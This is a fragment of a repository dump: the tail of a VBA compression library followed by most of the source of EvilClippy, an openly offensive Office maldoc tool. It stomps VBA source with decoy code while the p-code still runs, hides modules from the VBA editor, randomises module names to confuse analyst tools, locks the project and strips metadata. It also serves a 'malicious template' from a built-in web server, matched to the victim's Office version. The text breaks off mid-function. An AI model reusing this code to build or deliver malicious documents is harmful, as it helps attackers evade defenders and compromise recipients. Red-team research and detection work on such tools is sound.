sequence = new TokenSequence\n            {\n                _flagByte = reader.ReadByte()\n            };\n\n            for (var i = 0; i <= 7; i++)\n            {\n                if (sequence.GetIsCopyToken(i))\n                {\n                    var token = new CopyToken(reader, position);\n                    sequence._tokens.Add(token);\n                    position += Convert.ToInt64(token.Length);\n                }\n                else\n                {\n                    sequence._tokens.Add(new LiteralToken(reader));\n                    position += 1;\n                }\n            }\n            return sequence;\n        }\n\n        private void SetIsCopyToken(int index, bool value)\n        {\n            var setByte = (byte)Math.Pow(2, index);\n            _flagByte = (byte)(_flagByte | setByte);\n        }\n\n        private bool GetIsCopyToken(int index)\n        {\n            var compareByte = (byte)Math.Pow(2, index);\n            return (compareByte & _flagByte) != 0x0;\n        }\n\n        internal byte[] SerializeData()\n        {\n            var data = Enumerable.Repeat(_flagByte, 1);\n            foreach (var token in Tokens)\n            {\n                data = data.Concat(token.SerializeData());\n            }\n            return data.ToArray();\n        }\n    }\n\n    public static class VbaCompression\n    {\n        public static byte[] Compress(byte[] data)\n        {\n            var buffer = new DecompressedBuffer(data);\n            var container = new CompressedContainer(buffer);\n            return container.SerializeData();\n        }\n\n        public static byte[] Decompress(byte[] data)\n        {\n            var container = new CompressedContainer(data);\n            var buffer = new DecompressedBuffer(container);\n            return buffer.Data;\n        }\n    }\n}"
        },
        {
          "name": "evilclippy.cs",
          "type": "blob",
          "size": 25.2333984375,
          "content": "// EvilClippy \n// Cross-platform CFBF and MS-OVBA manipulation assistant\n//\n// Author: Stan Hegt (@StanHacked) / Outflank\n// Date: 20200415\n// Version: 1.3 (added GUI unhide option)\n//\n// Special thanks to Carrie Roberts (@OrOneEqualsOne) from Walmart for her contributions to this project.\n//\n// Compilation instructions\n// Mono: mcs /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs \n// Visual studio developer command prompt: csc /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs \n\nusing System;\nusing OpenMcdf;\nusing System.Text;\nusing System.Collections.Generic;\nusing Kavod.Vba.Compression;\nusing System.Linq;\nusing NDesk.Options;\nusing System.Net;\nusing System.Threading;\nusing System.IO;\nusing System.IO.Compression;\nusing System.Text.RegularExpressions;\nusing System.Collections;\n\npublic class MSOfficeManipulator\n{\n\t// Verbosity level for debug messages\n\tstatic int verbosity = 0;\n\n\t// Filename of the document that is about to be manipulated\n\tstatic string filename = \"\";\n\n        // Name of the generated output file.\n        static string outFilename = \"\";\n    \n\t// Compound file that is under editing\n\tstatic CompoundFile cf;\n\n\t// Byte arrays for holding stream data of file\n\tstatic byte[] vbaProjectStream;\n\tstatic byte[] dirStream;\n\tstatic byte[] projectStream;\n\tstatic byte[] projectwmStream;\n\n\tstatic public void Main(string[] args)\n\t{\n\t\t// List of target VBA modules to stomp, if empty => all modules will be stomped\n\t\tList<string> targetModules = new List<string>();\n\n\t\t// Filename that contains the VBA code used for substitution\n\t\tstring VBASourceFileName = \"\";\n\n\t\t// Target MS Office version for pcode\n\t\tstring targetOfficeVersion = \"\";\n\n\t\t// Option to hide modules from VBA editor GUI\n\t\tbool optionHideInGUI = false;\n\n\t\t// Option to unhide modules from VBA editor GUI\n\t\tbool optionUnhideInGUI = false;\n\n\t\t// Option to start web server to serve malicious template\n\t\tint optionWebserverPort = 0;\n\n\t\t// Option to display help\n\t\tbool optionShowHelp = false;\n\n\t\t// File format is OpenXML (docm or xlsm)\n\t\tbool is_OpenXML = false;\n\n\t\t// Option to delete metadata from file\n\t\tbool optionDeleteMetadata = false;\n\n\t\t// Option to set random module names in dir stream\n\t\tbool optionSetRandomNames = false;\n\n\t\t// Option to reset module names in dir stream (undo SetRandomNames option)\n\t\tbool optionResetModuleNames = false;\n\n\t\t// Option to set locked/unviewable options in Project Stream\n\t\tbool optionUnviewableVBA = false;\n\n        // Option to set unlocked/viewable options in Project Stream\n        bool optionViewableVBA = false;\n\n        // Temp path to unzip OpenXML files to\n        String unzipTempPath = \"\";\n\n\n\t\t// Start parsing command line arguments\n\t\tvar p = new OptionSet() {\n\t\t\t{ \"n|name=\", \"The target module name to stomp.\\n\" +\n\t\t\t\t\"This argument can be repeated.\",\n\t\t\t\tv => targetModules.Add (v) },\n\t\t\t{ \"s|sourcefile=\", \"File containing substitution VBA code (fake code).\",\n\t\t\t\tv => VBASourceFileName = v },\n\t\t\t{ \"g|guihide\", \"Hide code from VBA editor GUI.\",\n\t\t\t\tv => optionHideInGUI = v != null },\n\t\t\t{ \"gg|guiunhide\", \"Unhide code from VBA editor GUI.\",\n\t\t\t\tv => optionUnhideInGUI = v != null },\n\t\t\t{ \"t|targetversion=\", \"Target MS Office version the pcode will run on.\",\n\t\t\t\tv => targetOfficeVersion = v },\n\t\t\t{ \"w|webserver=\", \"Start web server on specified port to serve malicious template.\",\n\t\t\t\t(int v) => optionWebserverPort = v },\n\t\t\t{ \"d|delmetadata\", \"Remove metadata stream (may include your name etc.).\",\n\t\t\t\tv => optionDeleteMetadata = v != null },\n\t\t\t{ \"r|randomnames\", \"Set random module names, confuses some analyst tools.\",\n\t\t\t\tv => optionSetRandomNames = v != null },\n\t\t\t{ \"rr|resetmodulenames\", \"Undo the set random module names by making the ASCII module names in the DIR stream match their Unicode counter parts\",\n\t\t\t\tv => optionResetModuleNames = v != null },\n\t\t\t{ \"u|unviewableVBA\", \"Make VBA Project unviewable/locked.\",\n                v => optionUnviewableVBA = v != null },\n            { \"uu|viewableVBA\", \"Make VBA Project viewable/unlocked.\",\n                v => optionViewableVBA = v != null },\n            { \"v\", \"Increase debug message verbosity.\",\n\t\t\t\tv => { if (v != null) ++verbosity; } },\n\t\t\t{ \"h|help\",  \"Show this message and exit.\",\n\t\t\t\tv => optionShowHelp = v != null },\n\t\t};\n\n\t\tList<string> extra;\n\t\ttry\n\t\t{\n\t\t\textra = p.Parse(args);\n\t\t}\n\t\tcatch (OptionException e)\n\t\t{\n\t\t\tConsole.WriteLine(e.Message);\n\t\t\tConsole.WriteLine(\"Try '--help' for more information.\");\n\t\t\treturn;\n\t\t}\n\n\t\tif (extra.Count > 0)\n\t\t{\n\t\t\tfilename = string.Join(\" \", extra.ToArray());\n\t\t}\n\t\telse\n\t\t{\n\t\t\toptionShowHelp = true;\n\t\t}\n\n\t\tif (optionShowHelp)\n\t\t{\n\t\t\tShowHelp(p);\n\t\t\treturn;\n\t\t}\n\t\t// End parsing command line arguments\n\n\t\t// OLE Filename (make a copy so we don't overwrite the original)\n\t\toutFilename = getOutFilename(filename);\n\t\tstring oleFilename = outFilename;\n\n\t\t// Attempt to unzip as docm or xlsm OpenXML format\n\t\ttry\n\t\t{\n\t\t\tunzipTempPath = CreateUniqueTempDirectory();\n\t\t\tZipFile.ExtractToDirectory(filename, unzipTempPath);\n\t\t\tif (File.Exists(Path.Combine(unzipTempPath, \"word\", \"vbaProject.bin\"))) { oleFilename = Path.Combine(unzipTempPath, \"word\", \"vbaProject.bin\"); }\n\t\t\telse if (File.Exists(Path.Combine(unzipTempPath, \"xl\", \"vbaProject.bin\"))) { oleFilename = Path.Combine(unzipTempPath, \"xl\", \"vbaProject.bin\"); }\n\t\t\tis_OpenXML = true;\n\t\t}\n\t\tcatch (Exception)\n\t\t{\n\t\t\t// Not OpenXML format, Maybe 97-2003 format, Make a copy\n\t\t\tif (File.Exists(outFilename)) File.Delete(outFilename);\n\t\t\tFile.Copy(filename, outFilename);\n\t\t}\n\n\t\t// Open OLE compound file for editing\n\t\ttry\n\t\t{\n\t\t\tcf = new CompoundFile(oleFilename, CFSUpdateMode.Update, 0);\n\t\t}\n\t\tcatch (Exception e)\n\t\t{\n\t\t\tConsole.WriteLine(\"ERROR: Could not open file \" + filename);\n\t\t\tConsole.WriteLine(\"Please make sure this file exists and is .docm or .xlsm file or a .doc in the Office 97-2003 format.\");\n\t\t\tConsole.WriteLine();\n\t\t\tConsole.WriteLine(e.Message);\n\t\t\treturn;\n\t\t}\n\n        // Read relevant streams\n        CFStorage commonStorage = cf.RootStorage; // docm or xlsm\n\t\tif (cf.RootStorage.TryGetStorage(\"Macros\") != null) commonStorage = cf.RootStorage.GetStorage(\"Macros\"); // .doc\n\t\tif (cf.RootStorage.TryGetStorage(\"_VBA_PROJECT_CUR\") != null) commonStorage = cf.RootStorage.GetStorage(\"_VBA_PROJECT_CUR\"); // xls\t\t\n\t\tvbaProjectStream = commonStorage.GetStorage(\"VBA\").GetStream(\"_VBA_PROJECT\").GetData();\n\t\tprojectStream = commonStorage.GetStream(\"project\").GetData();\n\t\tprojectwmStream = commonStorage.GetStream(\"projectwm\").GetData();\n\t\tdirStream = Decompress(commonStorage.GetStorage(\"VBA\").GetStream(\"dir\").GetData());\n\n\t\t// Read project streams as string\n\t\tstring projectStreamString = System.Text.Encoding.UTF8.GetString(projectStream);\n\t\tstring projectwmStreamString = System.Text.Encoding.UTF8.GetString(projectwmStream);\n\n\t\t// Find all VBA modules in current file\n\t\tList<ModuleInformation> vbaModules = ParseModulesFromDirStream(dirStream);\n\n\t\t// Write streams to debug log (if verbosity enabled)\n\t\tDebugLog(\"Hex dump of original _VBA_PROJECT stream:\\n\" + Utils.HexDump(vbaProjectStream));\n\t\tDebugLog(\"Hex dump of original dir stream:\\n\" + Utils.HexDump(dirStream));\n\t\tDebugLog(\"Hex dump of original project stream:\\n\" + Utils.HexDump(projectStream));\n\n\t\t// Replace Office version in _VBA_PROJECT stream\n\t\tif (targetOfficeVersion != \"\")\n\t\t{\n\t\t\tReplaceOfficeVersionInVBAProject(vbaProjectStream, targetOfficeVersion);\n\t\t\tcommonStorage.GetStorage(\"VBA\").GetStream(\"_VBA_PROJECT\").SetData(vbaProjectStream);\n\t\t}\n        //Set ProjectProtectionState and ProjectVisibilityState to locked/unviewable see https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-ovba/dfd72140-85a6-4f25-8a17-70a89c00db8c\n        if (optionUnviewableVBA)\n        {\n            string tmpStr                 = Regex.Replace(projectStreamString, \"CMG=\\\".*\\\"\", \"CMG=\\\"\\\"\");\n            string newProjectStreamString = Regex.Replace(tmpStr             ,  \"GC=\\\".*\\\"\", \"GC=\\\"\\\"\" );\n            // Write changes to project stream\n            commonStorage.GetStream(\"project\").SetData(Encoding.UTF8.GetBytes(newProjectStreamString));\n        }\n\n        //Set ProjectProtectionState and ProjectVisibilityState to be viewable see https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-ovba/dfd72140-85a6-4f25-8a17-70a89c00db8c\n        if (optionViewableVBA)\n        {\n\t\t\tConsole.WriteLine(\"Making the project visible...\");\n\t\t\t// Console.WriteLine(\"Stream before: \" + projectStreamString);\t\t\t\t\t\n\t\t\tstring tmpStr = projectStreamString;\n\t\t    \t   tmpStr = Regex.Replace(tmpStr, \"CMG=\\\"?.*\\\"?\", \"CMG=\\\"CAC866BE34C234C230C630C6\\\"\");\n\t\t       \t   tmpStr = Regex.Replace(tmpStr,  \"ID=\\\"?.*\\\"?\", \"ID=\\\"{00000000-0000-0000-0000-000000000000}\\\"\");\n\t\t       \t   tmpStr = Regex.Replace(tmpStr, \"DPB=\\\"?.*\\\"?\", \"DPB=\\\"94963888C84FE54FE5B01B50E59251526FE67A1CC76C84ED0DAD653FD058F324BFD9D38DED37\\\"\");\n\t\t           tmpStr = Regex.Replace(tmpStr,  \"GC=\\\"?.*\\\"?\", \"GC=\\\"5E5CF2C27646414741474\\\"\");\n\t\t\tstring newProjectStreamString = tmpStr;\n\t\t\t// Console.WriteLine(\"Stream afterw: \" + newProjectStreamString);\t\t\t\t\t\n\n            // Write changes to project stream\n            commonStorage.GetStream(\"project\").SetData(Encoding.UTF8.GetBytes(newProjectStreamString));\n        }\n\n\n        // Hide modules from GUI\n        if (optionHideInGUI)\n\t\t{\n\t\t\tforeach (var vbaModule in vbaModules)\n\t\t\t{\n\t\t\t\tif ((vbaModule.moduleName != \"ThisDocument\") && (vbaModule.moduleName != \"ThisWorkbook\"))\n\t\t\t\t{\n\t\t\t\t\tConsole.WriteLine(\"Hiding module: \" + vbaModule.moduleName);\n\t\t\t\t\tprojectStreamString = projectStreamString.Replace(\"Module=\" + vbaModule.moduleName, \"\");\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t// Write changes to project stream\n\t\t\tcommonStorage.GetStream(\"project\").SetData(Encoding.UTF8.GetBytes(projectStreamString));\n\t\t}\n\n\t\t// Undo the Hide modules from GUI effects\n\t\tif (optionUnhideInGUI)\n\t\t{\n\t\t\tArrayList vbaModulesNamesFromProjectwm = getModulesNamesFromProjectwmStream(projectwmStreamString);\n\t\t\tRegex theregex = new Regex(@\"(Document\\=.*\\/.{10})([\\S\\s]*?)(ExeName32\\=|Name\\=|ID\\=|Class\\=|BaseClass\\=|Package\\=|HelpFile\\=|HelpContextID\\=|Description\\=|VersionCompatible32\\=|CMG\\=|DPB\\=|GC\\=)\");\n\t\t\tMatch m = theregex.Match(projectStreamString);\n\t\t\tif (m.Groups.Count != 4)\n\t\t\t{\n\t\t\t\tConsole.WriteLine(\"Error, could not find the location to insert module names. Not able to unhide modules\");\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tstring moduleString = \"\\r\\n\";\n\n\t\t\t\tforeach (var vbaModuleName in vbaModulesNamesFromProjectwm)\n\t\t\t\t{\n\t\t\t\t\tConsole.WriteLine(\"Unhiding module: \" + vbaModuleName);\n\t\t\t\t\tmoduleString = moduleString.Insert(moduleString.Length, \"Module=\" + vbaModuleName + \"\\r\\n\");\n\t\t\t\t}\n\n\t\t\t\tprojectStreamString = projectStreamString.Replace(m.Groups[0].Value, m.Groups[1].Value + moduleString + m.Groups[3].Value);\n\n\t\t\t\t// write changes to project stream\n\t\t\t\tcommonStorage.GetStream(\"project\").SetData(Encoding.UTF8.GetBytes(projectStreamString));\n\t\t\t}\n\t\t}\n\n\t\t// Stomp VBA modules\n\t\tif (VBASourceFileName != \"\")\n\t\t{\n\t\t\tbyte[] streamBytes;\n\n\t\t\tforeach (var vbaModule in vbaModules)\n\t\t\t{\n\t\t\t\tDebugLog(\"VBA module name: \" + vbaModule.moduleName + \"\\nOffset for code: \" + vbaModule.textOffset);\n\n\t\t\t\t// If this module is a target module, or if no targets are specified, then stomp\n\t\t\t\tif (targetModules.Contains(vbaModule.moduleName) || !targetModules.Any())\n\t\t\t\t{\n\t\t\t\t\tConsole.WriteLine(\"Now stomping VBA code in module: \" + vbaModule.moduleName);\n\n\t\t\t\t\tstreamBytes = commonStorage.GetStorage(\"VBA\").GetStream(vbaModule.moduleName).GetData();\n\n\t\t\t\t\tDebugLog(\"Existing VBA source:\\n\" + GetVBATextFromModuleStream(streamBytes, vbaModule.textOffset));\n\n\t\t\t\t\t// Get new VBA source code from specified text file. If not specified, VBA code is removed completely.\n\t\t\t\t\tstring newVBACode = \"\";\n\t\t\t\t\tif (VBASourceFileName != \"\")\n\t\t\t\t\t{\n\t\t\t\t\t\ttry\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tnewVBACode = System.IO.File.ReadAllText(VBASourceFileName);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tcatch (Exception e)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tConsole.WriteLine(\"ERROR: Could not open VBA source file \" + VBASourceFileName);\n\t\t\t\t\t\t\tConsole.WriteLine(\"Please make sure this file exists and contains ASCII only characters.\");\n\t\t\t\t\t\t\tConsole.WriteLine();\n\t\t\t\t\t\t\tConsole.WriteLine(e.Message);\n\t\t\t\t\t\t\treturn;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\n\t\t\t\t\tDebugLog(\"Replacing with VBA code:\\n\" + newVBACode);\n\n\t\t\t\t\tstreamBytes = ReplaceVBATextInModuleStream(streamBytes, vbaModule.textOffset, newVBACode);\n\n\t\t\t\t\tDebugLog(\"Hex dump of VBA module stream \" + vbaModule.moduleName + \":\\n\" + Utils.HexDump(streamBytes));\n\n\t\t\t\t\tcommonStorage.GetStorage(\"VBA\").GetStream(vbaModule.moduleName).SetData(streamBytes);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\n\t\t// Set random ASCII names for VBA modules in dir stream\n\t\tif (optionSetRandomNames)\n\t\t{\n\t\t\tConsole.WriteLine(\"Setting random ASCII names for VBA modules in dir stream (while leaving unicode names intact).\");\n\n\t\t\t// Recompress and write to dir stream\n\t\t\tcommonStorage.GetStorage(\"VBA\").GetStream(\"dir\").SetData(Compress(SetRandomNamesInDirStream(dirStream)));\n\t\t}\n\n\t\t// Reset module names in dir stream so that the ASCII names match the Unicode names (undo SetRandomNames option)\n\t\tif (optionResetModuleNames)\n\t\t{\n\t\t\tConsole.WriteLine(\"Resetting module names in dir stream to match names is _VBA_PROJECT stream (undo SetRandomNames option)\");\n\n\t\t\t// Recompress and write to dir stream\n\t\t\tcommonStorage.GetStorage(\"VBA\").GetStream(\"dir\").SetData(Compress(ResetModuleNamesInDirStream(dirStream)));\n\t\t}\n\n\t\t// Delete metadata from document\n\t\tif (optionDeleteMetadata)\n\t\t{\n\t\t\ttry\n\t\t\t{\n\t\t\t\tcf.RootStorage.Delete(\"\\u0005SummaryInformation\");\n\t\t\t}\n\t\t\tcatch (Exception e)\n\t\t\t{\n\t\t\t\tConsole.WriteLine(\"ERROR: metadata stream does not exist (option ignored)\");\n\t\t\t\tDebugLog(e.Message);\n\t\t\t}\n\t\t}\n\n\t\t// Commit changes and close file\n\t\tcf.Commit();\n\t\tcf.Close();\n\n\t\t// Purge unused space in file\n\t\tCompoundFile.ShrinkCompoundFile(oleFilename);\n\n\t\t// Zip the file back up as a docm or xlsm\n\t\tif (is_OpenXML)\n\t\t{\n\t\t\tif (File.Exists(outFilename)) File.Delete(outFilename);\n\t\t\tZipFile.CreateFromDirectory(unzipTempPath, outFilename);\n\t\t\t// Delete Temporary Files\n\t\t\tDirectory.Delete(unzipTempPath, true);\n\t\t}\n\n\t\t// Start web server, if option is specified\n\t\tif (optionWebserverPort != 0)\n\t\t{\n\t\t\ttry\n\t\t\t{\n\t\t\t\tWebServer ws = new WebServer(SendFile, \"http://*:\" + optionWebserverPort.ToString() + \"/\");\n\t\t\t\tws.Run();\n\t\t\t\tConsole.WriteLine(\"Webserver starting on port \" + optionWebserverPort.ToString() + \". Press a key to quit.\");\n\t\t\t\tConsole.ReadKey();\n\t\t\t\tws.Stop();\n\t\t\t\tConsole.WriteLine(\"Webserver closed. Goodbye!\");\n\t\t\t}\n\t\t\tcatch (Exception e)\n\t\t\t{\n\t\t\t\tConsole.WriteLine(\"ERROR: could not start webserver on specified port\");\n\t\t\t\tDebugLog(e.Message);\n\t\t\t}\n\t\t}\n\t}\n\n\tprivate static ArrayList getModulesNamesFromProjectwmStream(string projectwmStreamString)\n\t{\n\t\tArrayList vbaModulesNamesFromProjectwm = new ArrayList();\n\t\tRegex theregex = new Regex(@\"(?<=\\0{3})([^\\0]+?)(?=\\0)\");\n\t\tMatchCollection matches = theregex.Matches(projectwmStreamString);\n\n\t\tforeach (Match match in matches)\n\t\t{\n\t\t\tvbaModulesNamesFromProjectwm.Add(match.Value);\n\t\t}\n\n\t\treturn vbaModulesNamesFromProjectwm;\n\t}\n\n\tpublic static string getOutFilename(String filename)\n\t{\n\t\tstring fn = Path.GetFileNameWithoutExtension(filename);\n\t\tstring ext = Path.GetExtension(filename);\n\t\tstring path = Path.GetDirectoryName(filename);\n\t\treturn Path.Combine(path, fn + \"_EvilClippy\" + ext);\n\t}\n\n\tpublic static string CreateUniqueTempDirectory()\n\t{\n\t\tvar uniqueTempDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString()));\n\t\tDirectory.CreateDirectory(uniqueTempDir);\n\t\treturn uniqueTempDir;\n\t}\n\n\tstatic public byte[] SendFile(HttpListenerRequest request)\n\t{\n\t\tConsole.WriteLine(\"Serving request from \" + request.RemoteEndPoint.ToString() + \" with user agent \" + request.UserAgent);\n\n                CompoundFile cf = null;\n                try\n                {\n                    cf = new CompoundFile(outFilename, CFSUpdateMode.Update, 0);\n                }\n                catch (Exception e)\n                {\n                    Console.WriteLine(\"ERROR: Could not open file \" + outFilename);\n                    Console.WriteLine(\"Please make sure this file exists and is .docm or .xlsm file or a .doc in the Office 97-2003 format.\");\n                    Console.WriteLine();\n                    Console.WriteLine(e.Message);\n                }\n                \n\t\tCFStream streamData = cf.RootStorage.GetStorage(\"Macros\").GetStorage(\"VBA\").GetStream(\"_VBA_PROJECT\");\n\t\tbyte[] streamBytes = streamData.GetData();\n\n\t\tstring targetOfficeVersion = UserAgentToOfficeVersion(request.UserAgent);\n\n\t\tReplaceOfficeVersionInVBAProject(streamBytes, targetOfficeVersion);\n\n\t\tcf.RootStorage.GetStorage(\"Macros\").GetStorage(\"VBA\").GetStream(\"_VBA_PROJECT\").SetData(streamBytes);\n\n\t\t// Commit changes and close file\n\t\tcf.Commit();\n\t\tcf.Close();\n\n                Console.WriteLine(\"Serving out file '\" + outFilename + \"'\");\n\t\treturn File.ReadAllBytes(outFilename);\n\t}\n\n\tstatic string UserAgentToOfficeVersion(string userAgent)\n\t{\n\t\tstring officeVersion = \"\";\n\n\t\t// Determine version number\n\t\tif (userAgent.Contains(\"MSOffice 16\"))\n\t\t\tofficeVersion = \"2016\";\n\t\telse if (userAgent.Contains(\"MSOffice 15\"))\n\t\t\tofficeVersion = \"2013\";\n\t\telse\n\t\t\tofficeVersion = \"unknown\";\n\n\t\t// Determine architecture\n\t\tif (userAgent.Contains(\"x64\") || userAgent.Contains(\"Win64\"))\n\t\t\tofficeVersion += \"x64\";\n\t\telse\n\t\t\tofficeVersion += \"x86\";\n\n\t\tDebugLog(\"Determined Office version from user agent: \" + officeVersion);\n\n\t\treturn officeVersion;\n\t}\n\n\tstatic void ShowHelp(OptionSet p)\n\t{\n\t\tConsole.WriteLine(\"Usage: eviloffice.exe [OPTIONS]+ filename\");\n\t\tConsole.WriteLine();\n\t\tConsole.WriteLine(\"Author: Stan Hegt\");\n\t\tConsole.WriteLine(\"Email: stan@outflank.nl\");\n\t\tConsole.WriteLine();\n\t\tConsole.WriteLine(\"Options:\");\n\t\tp.WriteOptionDescriptions(Console.Out);\n\t}\n\n\tstatic void DebugLog(object args)\n\t{\n\t\tif (verbosity > 0)\n\t\t{\n\t\t\tConsole.WriteLine();\n\t\t\tConsole.WriteLine(\"########## DEBUG OUTPUT: ##########\");\n\t\t\tConsole.WriteLine(args);\n\t\t\tConsole.WriteLine(\"###################################\");\n\t\t\tConsole.WriteLine();\n\t\t}\n\t}\n\n\tprivate static byte[] ReplaceOfficeVersionInVBAProject(byte[] moduleStream, string officeVersion)\n\t{\n\t\tbyte[] version = new byte[2];\n\n\t\tswitch (officeVersion)\n\t\t{\n\t\t\tcase \"2010x86\":\n\t\t\t\tversion[0] = 0x97;\n\t\t\t\tversion[1] = 0x00;\n\t\t\t\tbreak;\n\t\t\tcase \"2013x86\":\n\t\t\t\tversion[0] = 0xA3;\n\t\t\t\tversion[1] = 0x00;\n\t\t\t\tbreak;\n\t\t\tcase \"2016x86\":\n\t\t\t\tversion[0] = 0xAF;\n\t\t\t\tversion[1] = 0x00;\n\t\t\t\tbreak;\n\t\t\tcase \"2019x86\":\n\t\t\t\tversion[0] = 0xAF;\n\t\t\t\tversion[1] = 0x00;\n\t\t\t\tbreak;\n\t\t\tcase \"2013x64\":\n\t\t\t\tversion[0] = 0xA6;\n\t\t\t\tversion[1] = 0x00;\n\t\t\t\tbreak;\n\t\t\tcase \"2016x64\":\n\t\t\t\tversion[0] = 0xB2;\n\t\t\t\tversion[1] = 0x00;\n\t\t\t\tbreak;\t\t\t\t\n\t\t\tcase \"2019x64\":\n\t\t\t\tversion[0] = 0xB2;\n\t\t\t\tversion[1] = 0x00;\n\t\t\t\tbreak;\t\t\t\t\n\t\t\tdefault:\n\t\t\t\tConsole.WriteLine(\"ERROR: Incorrect MS Office version specified - skipping this step.\");\n\t\t\t\treturn moduleStream;\n\t\t}\n\n\t\tConsole.WriteLine(\"Targeting pcode on Office version: \" + officeVersion);\n\n\t\tmoduleStream[2] = version[0];\n\t\tmoduleStream[3] = version[1];\n\n\t\treturn moduleStream;\n\t}\n\n\tprivate static byte[] ReplaceVBATextInModuleStream(byte[] moduleStream, UInt32 textOffset, string newVBACode)\n\t{\n\t\treturn moduleStream.Take((int)textOffset).Concat(Compress(Encoding.UTF8.GetBytes(newVBACode))).ToArray();\n\t}\n\n\tprivate static string GetVBATextFromModuleStream(byte[] moduleStream, UInt32 textOffset)\n\t{\n\t\tstring vbaModuleText = System.Text.Encoding.UTF8.GetString(Decompress(moduleStream.Skip((int)textOffset).ToArray()));\n\n\t\treturn vbaModuleText;\n\t}\n\n\tprivate static byte[] SetRandomNamesInDirStream(byte[] dirStream)\n\t{\n\t\t// 2.3.4.2 dir Stream: Version Independent Project Information\n\t\t// https://msdn.microsoft.com/en-us/library/dd906362(v=office.12).aspx\n\t\t// Dir stream is ALWAYS in little endian\n\n\t\tint offset = 0;\n\t\tUInt16 tag;\n\t\tUInt32 wLength;\n\n\t\twhile (offset < dirStream.Length)\n\t\t{\n\t\t\ttag = GetWord(dirStream, offset);\n\t\t\twLength = GetDoubleWord(dirStream, offset + 2);\n\n\t\t\t// The following idiocy is because Microsoft can't stick to their own format specification - taken from Pcodedmp\n\t\t\tif (tag == 9)\n\t\t\t\twLength = 6;\n\t\t\telse if (tag == 3)\n\t\t\t\twLength = 2;\n\n\t\t\tswitch (tag)\n\t\t\t{\n\t\t\t\tcase 26: // 2.3.4.2.3.2.3 MODULESTREAMNAME Record\n\t\t\t\t\tSystem.Text.UTF8Encoding encoding = new System.Text.UTF8Encoding();\n\t\t\t\t\tencoding.GetBytes(Utils.RandomString((int)wLength), 0, (int)wLength, dirStream, (int)offset + 6);\n\n\t\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\toffset += 6;\n\t\t\toffset += (int)wLength;\n\t\t}\n\n\t\treturn dirStream;\n\t}\n\n\tprivate static byte[] ResetModuleNamesInDirStream(byte[] dirStream)\n\t{\n\t\t// 2.3.4.2 dir Stream: Version Independent Project Information\n\t\t// https://msdn.microsoft.com/en-us/library/dd906362(v=office.12).aspx\n\t\t// Dir stream is ALWAYS in little endian\n\n\t\tint offset = 0;\n\t\tUInt16 tag;\n\t\tUInt32 wLength;\n\n\t\twhile (offset < dirStream.Length)\n\t\t{\n\t\t\ttag = GetWord(dirStream, offset);\n\t\t\twLength = GetDoubleWord(dirStream, offset + 2);\n\n\t\t\t// The following idiocy is because Microsoft can't stick to their own format specification - taken from Pcodedmp\n\t\t\tif (tag == 9)\n\t\t\t\twLength = 6;\n\t\t\telse if (tag == 3)\n\t\t\t\twLength = 2;\n\n\t\t\tswitch (tag)\n\t\t\t{\n\t\t\t\tcase 26: // 2.3.4.2.3.2.3 MODULESTREAMNAME Record\n\t\t\t\t\tSystem.Text.UTF8Encoding encoding = new System.Text.UTF8Encoding();\n\t\t\t\t\tUInt32 wLengthOrig = wLength;\n\t\t\t\t\tint offsetOrig = offset;\n\t\t\t\t\toffset += 6;\n\t\t\t\t\toffset += (int)wLength;\n\t\t\t\t\ttag = GetWord(dirStream, offset);\n\t\t\t\t\twLength = GetDoubleWord(dirStream, offset + 2);\n\t\t\t\t\tstring moduleNameFromUnicode = System.Text.Encoding.Unicode.GetString(dirStream.Skip(offset + 6).Take((int)wLength).ToArray());\n\t\t\t\t\tencoding.GetBytes(moduleNameFromUnicode, 0, (int)wLengthOrig, dirStream, (int)offsetOrig + 6);\n\t\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\toffset += 6;\n\t\t\toffset += (int)wLength;\n\t\t}\n\n\t\treturn dirStream;\n\t}\n\n\tprivate static List<ModuleInformation> ParseModulesFromDirStream(byte[] dirStream)\n\t{\n\t\t// 2.3.4.2 dir Stream: Version Independent Project Information\n\t\t// https://msdn.microsoft.com/en-us/library/dd906362(v=office.12).aspx\n\t\t// Dir stream is ALWAYS in little endian\n\n\t\tList<ModuleInformation> modules = new List<ModuleInformation>();\n\n\t\tint offset = 0;\n\t\tUInt16 tag;\n\t\tUInt32 wLength;\n\t\tModuleInformation currentModule = new ModuleInformation { moduleName = \"\", textOffset = 0 };\n\n\t\twhile (offset < dirStream.Length)\n\t\t{\n\t\t\ttag = GetWord(dirStream, offset);\n\t\t\twLength = GetDoubleWord(dirStream, offset + 2);\n\n\t\t\t// The following idiocy is because Microsoft can't stick to their own format specification - taken from Pcodedmp\n\t\t\tif (tag == 9)\n\t\t\t\twLength = 6;\n\t\t\telse if (tag == 3)\n\t\t\t\twLength = 2;\n\n\t\t\tswitch (tag)\n\t\t\t{\n\t\t\t\tcase 26: // 2.3.4.2.3.2.3 MODULESTREAMNAME Record\n\t\t\t\t\tcurrentModule.moduleName = System.Text.Encoding.UTF8.GetString(dirStream, (int)offset + 6, (int)wLength);\n\t\t\t\t\tbreak;\n\t\t\t\tcase 49: // 2.3.4.2.3.2.5 MODULEOFFSET Record\n\t\t\t\t\tcurrentModule.textOffset = GetDoubleWord(dirStream, offset + 6);\n\t\t\t\t\tmodules.Add(currentModule);\n\t\t\t\t\tcurrentModule = new ModuleInformation { moduleName = \"\", textOffset = 0 };\n\t\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\toffset += 6;\n\t\t\toffset += (int)wLength;\n\t\t}\n\n\t\treturn modules;\n\t}\n\n\tpublic class ModuleInformation\n\t{\n\t\tpublic string moduleName; // Name of VBA module stream\n\n\t\tpublic UInt32 textOffset; // Offset of VBA source code in VBA module stream\n\t}\n\n\tprivate static UInt16 GetWord(byte[] buffer, int offset)\n\t{\n\t\tvar rawBytes = new byte[2];\n\n\t\tArray.Copy(buffer, offset, rawBytes, 0, 